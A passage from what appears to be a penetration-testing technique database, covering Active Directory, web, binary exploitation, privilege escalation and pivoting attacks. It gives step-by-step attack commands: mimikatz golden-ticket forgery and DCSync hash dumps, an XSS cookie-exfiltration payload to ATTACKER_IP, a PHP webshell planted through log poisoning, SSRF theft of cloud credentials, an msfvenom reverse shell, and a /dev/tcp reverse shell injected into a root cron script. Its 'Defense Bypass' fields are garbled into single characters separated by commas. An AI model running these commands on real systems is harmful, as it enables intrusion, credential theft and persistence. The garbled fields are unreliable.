- When To Use: When you have identified users without Kerberos pre-authentication required.
- Prerequisites: List of valid usernames, Domain Controller IP
- Defense Bypass: A, S, -, R, E, P,  , R, o, a, s, t, i, n, g,  , g, e, n, e, r, a, t, e, s,  , E, v, e, n, t,  , I, D,  , 4, 7, 6, 8, .,  , A, c, c, o, u, n, t, s,  , w, i, t, h,  , p, r, e, -, a, u, t, h,  , d, i, s, a, b, l, e, d,  , a, r, e,  , r, a, r, e,  , a, n, d,  , s, h, o, u, l, d,  , b, e,  , i, n, v, e, s, t, i, g, a, t, e, d, .
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1558.004
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Enumerate users without Kerberos pre-authentication', 'command': 'impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat', 'note': 'Or use ldapsearch with userAccountControl flag 4194304 (DONT_REQ_PREAUTH)'}
  2. {'step': 2, 'description': 'Crack AS-REP hashes offline', 'command': 'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt', 'note': 'Users with DONT_REQ_PREAUTH are often misconfigured service accounts with weak passwords'}
  3. {'step': 3, 'description': 'Use cracked credentials', 'command': 'impacket-psexec domain/user:cracked_pass@TARGET', 'note': 'AS-REP roasting requires no initial credentials - works completely unauthenticated'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gdb, gpp-decrypt, hashcat, impacket, impacket-secretsdump, john

#### pass-the-hash — Pass-the-Hash
- Zone: active-directory | Category: active-directory | Difficulty: 2
- OS: linux, windows
- Tags: active-directory, ntlm, credentials, pass-the-hash, smb
- Purpose: Authenticate to remote services using NTLM hashes directly without knowing the plaintext password.
- When To Use: When you have obtained NTLM hashes and want to access other systems without cracking the password.
- Prerequisites: NTLM hash of a valid account, Target system accessible
- Defense Bypass: P, a, s, s, -, t, h, e, -, h, a, s, h,  , d, o, e, s,  , n, o, t,  , r, e, q, u, i, r, e,  , p, l, a, i, n, t, e, x, t,  , p, a, s, s, w, o, r, d, s, .,  , L, o, g, s,  , s, h, o, w,  , a, u, t, h, e, n, t, i, c, a, t, i, o, n,  , w, i, t, h,  , t, h, e,  , a, c, c, o, u, n, t,  , n, a, m, e,  , b, u, t,  , n, o, t,  , t, h, e,  , p, a, s, s, w, o, r, d, .
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1550.002
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Obtain NTLM hash from any source (SAM, LSASS, NTLM relay)', 'command': 'N/A - hash obtained from prior compromise', 'note': 'Sources: secretsdump, Mimikatz, NTLM relay, Responder'}
  2. {'step': 2, 'description': 'Pass hash to authenticate without plaintext', 'command': 'impacket-psexec -hashes :NTLM_HASH domain/user@TARGET', 'note': 'Colon before hash indicates no LM hash, only NTLM'}
  3. {'step': 3, 'description': 'Alternative: use NetExec for pass-the-hash', 'command': 'nxc smb TARGET -u user -H NTLM_HASH', 'note': 'NetExec (nxc) is the modern successor to CrackMapExec'}
  4. {'step': 4, 'description': 'Use Evil-WinRM for Windows shells with hash', 'command': 'evil-winrm -i TARGET -u user -H NTLM_HASH', 'note': 'Requires WinRM (5985/5986) open on target'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, cewl, coercer, crackmapexec, crunch, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute

#### golden-ticket — Golden Ticket Attack
- Zone: active-directory | Category: active-directory | Difficulty: 5
- OS: windows
- Tags: active-directory, kerberos, persistence, domain-admin, golden-ticket
- Purpose: Create a forged Kerberos TGT using the KRBTGT account hash to gain persistent domain admin access.
- When To Use: When you have compromised the KRBTGT account hash and want to create persistent domain admin access.
- Prerequisites: KRBTGT account NTLM hash, Domain name, Domain SID
- Defense Bypass: G, o, l, d, e, n,  , t, i, c, k, e, t, s,  , a, r, e,  , v, a, l, i, d,  , f, o, r,  , 1, 0,  , y, e, a, r, s,  , b, y,  , d, e, f, a, u, l, t,  , a, n, d,  , b, y, p, a, s, s,  , a, l, l,  , n, o, r, m, a, l,  , a, u, t, h, e, n, t, i, c, a, t, i, o, n,  , c, h, e, c, k, s, .,  , D, e, t, e, c, t, i, o, n,  , r, e, q, u, i, r, e, s,  , m, o, n, i, t, o, r, i, n, g,  , f, o, r,  , u, n, u, s, u, a, l,  , K, e, r, b, e, r, o, s,  , T, G, T,  , p, a, t, t, e, r, n, s, .
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1558.001
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Dump KRBTGT hash via DCSync', 'command': 'mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /user:krbtgt', 'when': 'When you have DA privileges or replication rights', 'output': 'NTLM hash of KRBTGT account'}
  2. {'step': 2, 'description': 'Create golden ticket', 'command': 'mimikatz # kerberos::golden /domain:TARGET_DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /id:500 /ptt', 'when': 'After obtaining KRBTGT hash', 'output': 'Golden TGT injected into memory'}
  3. {'step': 3, 'description': 'Access any domain resource', 'command': 'dir \\\\DC01\\c$', 'when': 'After injecting the golden ticket', 'output': 'Access to domain controller and all domain resources'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### dcsync — DCSync Attack
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: linux, windows
- Tags: active-directory, credentials, dcsync, domain, hashes
- Purpose: Simulate a Domain Controller to replicate directory data and extract all domain hashes.
- When To Use: When you have domain admin privileges or specific replication rights on a domain controller.
- Prerequisites: Domain Admin privileges or Replicating Directory Changes rights, Access to a domain controller
- Defense Bypass: D, C, S, y, n, c,  , a, b, u, s, e, s,  , l, e, g, i, t, i, m, a, t, e,  , r, e, p, l, i, c, a, t, i, o, n,  , p, r, o, t, o, c, o, l, s, .,  , D, e, t, e, c, t, i, o, n,  , r, e, q, u, i, r, e, s,  , m, o, n, i, t, o, r, i, n, g,  , f, o, r,  , u, n, u, s, u, a, l,  , r, e, p, l, i, c, a, t, i, o, n,  , r, e, q, u, e, s, t, s,  , (, E, v, e, n, t,  , I, D,  , 4, 6, 6, 2, ), .
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1003.006
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Obtain credentials with Replicating Directory Changes rights', 'command': 'N/A - DA/EA accounts have these rights by default', 'note': 'Can also be granted via ACL abuse (WriteDacl, GenericWrite)'}
  2. {'step': 2, 'description': 'Dump all domain hashes via DCSync', 'command': 'impacket-secretsdump -just-dc domain/da_user:pass@DC_IP', 'note': 'Simulates a DC replication request; dumps all NTDS.dit hashes'}
  3. {'step': 3, 'description': 'Alternative: Mimikatz DCSync on compromised DC', 'command': 'mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt', 'note': 'Requires running on the DC itself or with DA rights'}
  4. {'step': 4, 'description': 'Extract krbtgt hash for Golden Ticket', 'command': 'impacket-secretsdump -just-dc-user krbtgt domain/da:pass@DC_IP', 'note': 'krbtgt hash is the key to unlimited domain persistence'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, feroxbuster, ffuf, gobuster, gpp-decrypt, impacket, impacket-secretsdump

#### xss — Cross-Site Scripting (XSS)
- Zone: web | Category: web | Difficulty: 2
- OS: any
- Tags: web, xss, injection, owasp, client-side
- Purpose: Inject malicious scripts into web pages viewed by other users to steal cookies, session tokens, or perform actions on their behalf.
- When To Use: When user input is reflected in the page without proper sanitization.
- Prerequisites: Target web application with reflected or stored input, Burp Suite or browser for testing
- Defense Bypass: X, S, S,  , r, e, q, u, i, r, e, s,  , u, s, e, r,  , i, n, t, e, r, a, c, t, i, o, n,  , u, n, l, e, s, s,  , s, t, o, r, e, d, .,  , W, A, F, s,  , m, a, y,  , b, l, o, c, k,  , s, c, r, i, p, t,  , t, a, g, s, .,  , U, s, e,  , e, n, c, o, d, i, n, g,  , a, n, d,  , a, l, t, e, r, n, a, t, e,  , v, e, c, t, o, r, s, .
- Remediation: Input validation, output encoding, parameterized queries, WAF rules
- MITRE ID: T1059.007
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Test for reflected XSS', 'command': "<script>alert('XSS')</script>", 'when': 'When testing GET/POST parameters', 'note': 'Inject into every parameter and observe if script executes'}
  2. {'step': 2, 'description': 'Bypass filters with encoding', 'command': "<img src=x onerror=alert('XSS')>", 'when': 'When basic script tags are filtered', 'note': 'Try event handlers, URL encoding, and HTML entities'}
  3. {'step': 3, 'description': 'Exfiltrate cookies', 'command': "<script>fetch('http://ATTACKER_IP/?c='+document.cookie)</script>", 'when': 'After confirming XSS is possible', 'output': 'Stolen session cookies sent to attacker server'}
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite, liffy

#### ssrf — Server-Side Request Forgery (SSRF)
- Zone: web | Category: web | Difficulty: 3
- OS: any
- Tags: web, ssrf, injection, internal, cloud
- Purpose: Trick a server into making requests to internal resources or external systems that it can access.
- When To Use: When a web application accepts user-controlled URLs or makes requests to internal systems.
- Prerequisites: Target web application with URL parameters, Internal network access from the server
- Defense Bypass: S, S, R, F,  , o, f, t, e, n,  , b, y, p, a, s, s, e, s,  , f, i, r, e, w, a, l, l,  , r, e, s, t, r, i, c, t, i, o, n, s,  , s, i, n, c, e,  , r, e, q, u, e, s, t, s,  , c, o, m, e,  , f, r, o, m,  , t, h, e,  , s, e, r, v, e, r,  , i, t, s, e, l, f, .,  , C, l, o, u, d,  , m, e, t, a, d, a, t, a,  , e, n, d, p, o, i, n, t, s,  , a, r, e,  , c, o, m, m, o, n,  , t, a, r, g, e, t, s, .
- Remediation: Input validation, output encoding, parameterized queries, WAF rules
- MITRE ID: T1189
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify parameters that make outbound requests', 'command': 'Look for URL, fetch, redirect, proxy, external_link parameters', 'note': 'Common in webhooks, integrations, PDF generators, and cloud metadata endpoints'}
  2. {'step': 2, 'description': 'Test for SSRF with internal targets', 'command': 'http://target/?url=http://127.0.0.1:8080/admin', 'note': 'Try 127.0.0.1, localhost, 169.254.169.254 (cloud metadata)'}
  3. {'step': 3, 'description': 'Enumerate internal services via SSRF', 'command': 'Use Burp Intruder with internal IP/port list', 'note': 'Discover internal services not reachable externally'}
  4. {'step': 4, 'description': 'Exploit cloud metadata endpoints', 'command': 'http://target/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'note': 'AWS/GCP/Azure metadata endpoints yield temporary credentials'}
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite, liffy

#### file-inclusion — Local and Remote File Inclusion
- Zone: web | Category: web | Difficulty: 2
- OS: any
- Tags: web, lfi, rfi, injection, rce
- Purpose: Include local or remote files into a web application to execute code or read sensitive files.
- When To Use: When a web application includes user-controlled file paths in its output.
- Prerequisites: Target web application with file inclusion vulnerability, Knowledge of file paths on the server
- Defense Bypass: F, i, l, e,  , i, n, c, l, u, s, i, o, n,  , m, a, y,  , b, y, p, a, s, s,  , W, A, F, s, .,  , U, s, e,  , n, u, l, l,  , b, y, t, e, s, ,,  , e, n, c, o, d, i, n, g, ,,  , a, n, d,  , a, l, t, e, r, n, a, t, e,  , p, a, t, h,  , s, e, p, a, r, a, t, o, r, s, .
- Remediation: Input validation, output encoding, parameterized queries, WAF rules
- MITRE ID: T1190
- Command: #
- Steps (5):
  1. {'step': 1, 'description': 'Identify file-path parameters', 'command': 'Look for ?page=, ?file=, ?template=, ?include= parameters', 'note': 'Any parameter that references files is a candidate'}
  2. {'step': 2, 'description': 'Test for path traversal', 'command': '?page=../../../../etc/passwd', 'note': 'If ../ is filtered, use ....// or URL-encoding'}
  3. {'step': 3, 'description': 'Read source code via php://filter', 'command': '?page=php://filter/convert.base64-encode/resource=index.php', 'note': 'Discloses config files with DB credentials without needing SQLi'}
  4. {'step': 4, 'description': 'Escalate to RCE via log poisoning', 'command': 'curl http://target/ -A "<?php system($_GET[cmd]); ?>" then ?page=.../var/log/apache2/access.log&cmd=id', 'note': 'Apache logs User-Agent verbatim; including log executes injected PHP'}
  5. {'step': 5, 'description': 'Write persistent webshell', 'command': '&cmd=echo "<?=`$_GET[0]?>" > cmd.php', 'note': 'file_put_contents via log poison creates persistent shell'}
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, evil-winrm, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite

#### format-string — Format String Exploitation
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux
- Tags: binary, format-string, memory, exploitation, printf
- Purpose: Exploit format string vulnerabilities to read/write memory and potentially gain code execution.
- When To Use: When user input is passed directly as a format string to printf-like functions without format specifiers.
- Prerequisites: Binary with format string vulnerability, Knowledge of stack layout, Debugger for analysis
- Defense Bypass: F, o, r, m, a, t,  , s, t, r, i, n, g,  , b, u, g, s,  , c, a, n,  , r, e, a, d, /, w, r, i, t, e,  , a, r, b, i, t, r, a, r, y,  , m, e, m, o, r, y, .,  , S, t, a, c, k,  , c, a, n, a, r, i, e, s,  , d, o, n, ', t,  , h, e, l, p, .,  , A, S, L, R,  , r, e, q, u, i, r, e, s,  , i, n, f, o, r, m, a, t, i, o, n,  , l, e, a, k, .
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1190
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Identify format string vulnerability', 'command': './vulnerable_binary AAAA%x%x%x%x', 'when': 'When input is reflected in output without format specifiers', 'output': 'Stack values revealed by %x specifiers'}
  2. {'step': 2, 'description': 'Find offset to stack position', 'command': './vulnerable_binary AAAA%4$x', 'when': 'After confirming format string exists', 'output': 'Offset where our input appears on stack'}
  3. {'step': 3, 'description': 'Write to memory using %n', 'command': './vulnerable_binary $(python3 -c \'print("AAAA" + "%x "*20)\')', 'when': 'When offset is known', 'output': 'Memory written to arbitrary address'}
- Related Tools: 15 — ROPgadget, angr, checksec, commix, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap

#### rop-chain — Return-Oriented Programming (ROP)
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 5
- OS: linux, windows
- Tags: binary, rop, exploitation, dep, nx
- Purpose: Chain existing code snippets (gadgets) to bypass DEP/NX and achieve code execution without injecting shellcode.
- When To Use: When NX/DEP is enabled and shellcode cannot be executed on the stack.
- Prerequisites: Binary with stack executable disabled (NX), ROP gadgets available, Knowledge of stack layout
- Defense Bypass: R, O, P,  , b, y, p, a, s, s, e, s,  , N, X, /, D, E, P,  , b, y,  , r, e, u, s, i, n, g,  , e, x, i, s, t, i, n, g,  , c, o, d, e, .,  , A, S, L, R,  , r, e, q, u, i, r, e, s,  , r, e, t, 2, p, l, t,  , o, r,  , i, n, f, o, r, m, a, t, i, o, n,  , l, e, a, k,  , f, o, r,  , a, d, d, r, e, s, s, e, s, .
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (5):
  1. {'step': 1, 'description': 'Identify binary protections', 'command': 'checksec --file=./binary', 'note': 'NX+PIE enabled = need ROP; note architecture (x86 vs x64)'}
  2. {'step': 2, 'description': 'Find offset to RIP/EIP', 'command': 'pwn cyclic 200 && gdb ./binary (run with pattern, note EIP value, cyclic -l value)', 'note': 'Classic De Bruijn pattern offset finding'}
  3. {'step': 3, 'description': 'Find ROP gadgets', 'command': 'ROPgadget --binary ./binary --only "pop|ret"', 'note': 'For x64, need "pop rdi; ret" to set first argument (RDI)'}
  4. {'step': 4, 'description': 'Build system("/bin/sh") chain (x64)', 'command': 'pop_rdi + binsh_addr + system_addr + exit_addr', 'note': 'x86: push binsh; ret; call system; exit on stack'}
  5. {'step': 5, 'description': 'Leak libc base if ASLR enabled', 'command': 'puts_plt + puts_got + main_addr (stage 1 leak)', 'note': 'Compute libc base from leaked puts() address, then stage 2 system()'}
- Related Tools: 15 — ROPgadget, angr, checksec, commix, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap

#### shellcode-development — Shellcode Development
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 5
- OS: linux, windows
- Tags: binary, shellcode, exploitation, assembly, payload
- Purpose: Write position-independent shellcode to spawn shells or execute commands in exploitation.
- When To Use: When you control EIP/RIP and need to execute code, but stack is non-executable.
- Prerequisites: Understanding of assembly, Target architecture (x86/x64), Knowledge of syscall numbers
- Defense Bypass: S, h, e, l, l, c, o, d, e,  , r, e, q, u, i, r, e, s,  , e, x, e, c, u, t, a, b, l, e,  , m, e, m, o, r, y, .,  , B, y, p, a, s, s,  , N, X,  , w, i, t, h,  , R, O, P, ,,  , r, e, t, 2, p, l, t, ,,  , o, r,  , r, e, t, u, r, n, -, t, o, -, l, i, b, c, .
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Generate shellcode with msfvenom', 'command': 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f python -b "\\x00\\x0a\\x0d"', 'note': '-b specifies badchars to avoid; output format should match exploit'}
  2. {'step': 2, 'description': 'Assemble custom shellcode with pwntools', 'command': 'python3 -c "from pwn import *; print(asm(shellcraft.sh()))"', 'note': 'pwntools shellcraft generates position-independent shellcode'}
  3. {'step': 3, 'description': 'Test shellcode locally', 'command': 'gcc -z execstack -no-pie shellcode_test.c -o test && ./test', 'note': 'Ensure NX is disabled for testing; use checksec to verify'}
  4. {'step': 4, 'description': 'Integrate into exploit', 'command': 'payload = offset + p32(jmp_esp) + nop_sled + shellcode', 'note': 'NOP sled before shellcode increases reliability'}
- Related Tools: 15 — ROPgadget, angr, checksec, commix, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap

#### iot-uart-debug — UART Debug Access
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 4
- OS: linux
- Tags: iot, uart, hardware, debug, serial
- Purpose: Access IoT device console via UART serial interface
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1082
- Command: #
- Steps (6):
  1. {'step': 1, 'description': 'Physically open the IoT device', 'command': 'N/A - physical access required', 'note': 'Use screwdriver to open device casing; look for UART header (4-6 pins) on PCB'}
  2. {'step': 2, 'description': 'Identify UART pins (TX, RX, GND, VCC)', 'command': 'Use multimeter to identify pins: GND=continuity with shield, TX=3.3V when powered, RX=floats when idle', 'note': 'VCC is usually 3.3V or 5V; do NOT connect VCC if already powered'}
  3. {'step': 3, 'description': 'Connect USB-to-TTL adapter to UART pins', 'command': 'Connect adapter: GND->GND, TX->RX, RX->TX, VCC->3.3V (if needed)', 'note': 'Cross TX/RX; adapter TX goes to device RX and vice versa'}
  4. {'step': 4, 'description': 'Determine baud rate', 'command': 'Try common baud rates: 115200, 57600, 38400, 19200, 9600', 'note': 'U-Boot bootloader often uses 115200; check for boot messages'}
  5. {'step': 5, 'description': 'Connect with serial terminal', 'command': 'screen /dev/ttyUSB0 115200', 'note': 'Alternative: minicom -b 115200 -o -D /dev/ttyUSB0'}
  6. {'step': 6, 'description': 'Interact with bootloader/shell', 'command': 'Interrupt boot (press Enter/Space during boot)', 'note': 'If U-Boot: run bootcmd or boot; if Linux: get root shell'}
- Related Tools: 15 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, flashrom, jtagulator, minicom, mosquitto-clients, mqtt-explorer, openocd, picocom, qemu, qemu-arm-static, qemu-mips-static, routersploit

#### crypto-analysis — Cryptographic Analysis
- Zone: ctf | Category: ctf | Difficulty: 3
- OS: any
- Tags: ctf, cryptography, encoding, decryption, analysis
- Purpose: Analyze and break cryptographic systems including encryption, hashing, and encoding schemes.
- When To Use: When a CTF challenge involves encrypted data, hashes, or encoded messages.
- Prerequisites: Encrypted or encoded data, Understanding of crypto primitives
- Defense Bypass: C, r, y, p, t, a, n, a, l, y, s, i, s,  , r, e, q, u, i, r, e, s,  , k, n, o, w, l, e, d, g, e,  , o, f,  , t, h, e,  , a, l, g, o, r, i, t, h, m, .,  , W, e, a, k,  , p, a, s, s, w, o, r, d, s,  , m, a, k, e,  , e, n, c, r, y, p, t, e, d,  , d, a, t, a,  , v, u, l, n, e, r, a, b, l, e,  , t, o,  , d, i, c, t, i, o, n, a, r, y,  , a, t, t, a, c, k, s, .
- Remediation: General security best practices and input validation
- MITRE ID: T1040
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify encoding/encryption type', 'command': 'file secret.bin && binwalk secret.bin', 'note': 'Check for Base64, XOR, RC4, AES, or custom encoding'}
  2. {'step': 2, 'description': 'Decode Base64 layers', 'command': 'echo "BASE64STRING" | base64 -d', 'note': 'Multiple Base64 encodings are common in CPENT challenges'}
  3. {'step': 3, 'description': 'Identify XOR key and decrypt', 'command': 'Use CyberChef (From Base64 -> XOR) or python XOR decryption script', 'note': 'Single-byte XOR: try all 256 keys; multi-byte: frequency analysis'}
  4. {'step': 4, 'description': 'Decrypt RC4 with known key', 'command': 'python3 -c "from Crypto.Cipher import ARC4; print(ARC4.new(key).decrypt(ciphertext))"', 'note': 'RC4 key often found in code comments or config files'}
- Related Tools: 15 — angr, checksec, cyberchef, exiftool, ghidra, hashcat, john, mimikatz, pwninit, pwntools, radare2, stegcracker, steghide, stegsolve, testssl-sh

#### suid-abuse — SUID Binary Privilege Escalation
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 2
- OS: linux
- Tags: privilege-escalation, linux, suid, root, binary
- Purpose: Exploit SUID (Set User ID) binaries that run with elevated privileges to gain root access.
- When To Use: When you have a low-privilege shell on Linux and want to escalate to root.
- Prerequisites: Low-privilege shell on Linux target, SUID binaries present on system
- Defense Bypass: S, U, I, D,  , b, i, n, a, r, i, e, s,  , a, r, e,  , i, n, t, e, n, d, e, d,  , f, o, r,  , p, r, i, v, i, l, e, g, e,  , e, s, c, a, l, a, t, i, o, n, .,  , D, e, t, e, c, t, i, o, n,  , r, e, q, u, i, r, e, s,  , m, o, n, i, t, o, r, i, n, g,  , u, n, u, s, u, a, l,  , e, x, e, c, u, t, i, o, n, s,  , o, f,  , S, U, I, D,  , b, i, n, a, r, i, e, s, .
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1059.004
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Enumerate SUID binaries', 'command': 'find / -perm -4000 -type f 2>/dev/null', 'note': 'SUID bit lets binary run with owner privileges (usually root)'}
  2. {'step': 2, 'description': 'Check GTFOBins for known abuses', 'command': 'Visit gtfobins.github.io and search for the binary name', 'note': 'GTFOBins lists exact commands for shell escape via SUID binaries'}
  3. {'step': 3, 'description': 'Exploit if GTFOBins entry exists', 'command': 'Example: ./find / -exec /bin/sh -p \\; -quit', 'note': 'The -p flag preserves root privileges when running shell'}
  4. {'step': 4, 'description': 'Check for custom SUID binaries with buffer overflows', 'command': 'strings SUID_BINARY | grep -i "system\\|exec\\|bin/sh"', 'note': 'Custom binaries may have exploitable functions'}
- Related Tools: 15 — accesschk, angr, beroot, bloodyad, checksec, curl, dig, docker, file, find, gdb, gdb-multiarch, gef, getcap, ghidra

#### sudo-misconfiguration — Sudo Misconfiguration Exploitation
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 2
- OS: linux
- Tags: privilege-escalation, linux, sudo, root, misconfiguration
- Purpose: Exploit misconfigured sudo permissions to execute commands as root or other users.
- When To Use: When a user can run specific commands via sudo without a password, or with dangerous configurations.
- Prerequisites: User account with sudo privileges, Knowledge of allowed sudo commands
- Defense Bypass: S, u, d, o,  , c, o, m, m, a, n, d, s,  , a, r, e,  , l, o, g, g, e, d, .,  , U, s, e,  , N, O, P, A, S, S, W, D,  , e, n, t, r, i, e, s,  , o, r,  , G, T, F, O, B, i, n, s,  , t, e, c, h, n, i, q, u, e, s,  , t, o,  , a, v, o, i, d,  , p, a, s, s, w, o, r, d,  , p, r, o, m, p, t, s, .
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1059.004
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Check sudo permissions', 'command': 'sudo -l', 'when': 'When you have a shell on a Linux target', 'output': 'List of commands the user can run via sudo'}
  2. {'step': 2, 'description': 'Exploit sudo with NOPASSWD', 'command': "sudo /usr/bin/vim -c ':!/bin/bash'", 'when': 'When vim is allowed via sudo', 'output': 'Root shell via vim'}
  3. {'step': 3, 'description': 'Exploit sudo with script execution', 'command': 'sudo /usr/bin/python3 -c \'import os; os.system("/bin/bash")\'', 'when': 'When python is allowed via sudo', 'output': 'Root shell'}
- Related Tools: 15 — accesschk, beroot, bloodyad, corsy, find, getcap, godpotato, icacls, jucypotato, juicy-potato, linenum, linpeas, linux-exploit-suggester, lse, powerup

#### cron-jobs — Cron Job Privilege Escalation
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 2
- OS: linux
- Tags: privilege-escalation, linux, cron, root, scheduled-tasks
- Purpose: Exploit writable cron scripts or cron directories to execute code as root.
- When To Use: When you have write access to files in /etc/cron.* directories or can modify cron scripts.
- Prerequisites: Write access to /etc/cron.d/, /etc/cron.*, or /var/spool/cron/, Knowledge of cron schedule
- Defense Bypass: C, r, o, n,  , j, o, b, s,  , r, u, n,  , a, s,  , r, o, o, t, .,  , I, f,  , y, o, u,  , c, a, n,  , w, r, i, t, e,  , t, o,  , a,  , c, r, o, n,  , s, c, r, i, p, t, ,,  , y, o, u,  , g, e, t,  , r, o, o, t,  , e, x, e, c, u, t, i, o, n, .,  , H, a, r, d,  , t, o,  , d, e, t, e, c, t,  , w, i, t, h, o, u, t,  , f, i, l, e,  , i, n, t, e, g, r, i, t, y,  , m, o, n, i, t, o, r, i, n, g, .
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1053.003
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Enumerate cron jobs', 'command': 'cat /etc/crontab && ls -la /etc/cron.* && crontab -l', 'note': 'Check system crontab, /etc/cron.d/, and user crontabs'}
  2. {'step': 2, 'description': 'Identify writable scripts/binaries', 'command': 'ls -la /etc/cron.daily/* && ls -la /path/to/cron/script.sh', 'note': 'If script is world-writable or owned by your user, you can modify it'}
  3. {'step': 3, 'description': 'Inject malicious command', 'command': 'echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /etc/cron.daily/backup.sh', 'note': 'Script will execute as root at next cron interval'}
  4. {'step': 4, 'description': 'Alternative: PATH hijacking', 'command': 'echo "/bin/bash" > /tmp/ls && chmod +x /tmp/ls && export PATH=/tmp:$PATH', 'note': 'If cron script calls binaries without full paths, your PATH takes precedence'}
- Related Tools: 15 — accesschk, beroot, bloodyad, find, getcap, godpotato, icacls, jucypotato, juicy-potato, linenum, linpeas, linux-exploit-suggester, lse, powerup, printspoofer

#### pivoting — Network Pivoting
- Zone: lateral-movement | Category: lateral-movement | Difficulty: 3
- OS: linux
- Tags: lateral-movement, pivoting, tunneling, socks, internal
- Purpose: Access internal networks through compromised hosts
- When To Use: When you have a shell on a host that has access to additional internal networks.
- Prerequisites: Shell on a pivot host with network access, Tool for tunneling (Chisel, Ligolo, Socat)
- Defense Bypass: T, u, n, n, e, l,  , t, r, a, f, f, i, c,  , t, h, r, o, u, g, h,  , c, o, m, p, r, o, m, i, s, e, d,  , h, o, s, t, .,  , T, r, a, f, f, i, c,  , a, p, p, e, a, r, s,  , t, o,  , c, o, m, e,  , f, r, o, m,  , t, h, e,  , p, i, v, o, t,  , h, o, s, t, ,,  , n, o, t,  , t, h, e,  , a, t, t, a, c, k, e, r, .
- Remediation: Network segmentation, disable SMBv1, enforce strong authentication
- MITRE ID: T1570
- Command: #
- Steps (8):
  1. {'step': 1, 'description': 'Confirm pivot host has dual interfaces', 'command': 'ip a || ifconfig', 'note': 'Identify internal interface and subnet reachable from pivot'}
  2. {'step': 2, 'description': 'Upload tunneling tool to pivot', 'command': 'scp chisel user@pivot:/tmp/ || wget/curl from pivot', 'note': 'Or use existing installed tools on pivot'}
  3. {'step': 3, 'description': 'Start Chisel server on attacker', 'command': 'chisel server -p 8000 --reverse', 'note': 'Runs on Kali attacker machine'}
  4. {'step': 4, 'description': 'Connect Chisel client from pivot', 'command': './chisel client ATTACKER_IP:8000 R:socks', 'note': 'Client initiates outbound connection (bypasses inbound firewall)'}
  5. {'step': 5, 'description': 'Configure proxychains', 'command': 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf', 'note': 'Chisel creates SOCKS proxy on port 1080 by default'}
  6. {'step': 6, 'description': 'Pivot tools through proxy', 'command': 'proxychains4 nmap -sT -Pn TARGET_INTERNAL', 'note': 'All tools supporting SOCKS can now reach internal network'}
  7. {'step': 7, 'description': 'For Ligolo-ng alternative: create TUN interface', 'command': 'sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up', 'note': 'Ligolo creates TUN interface, no proxychains needed'}
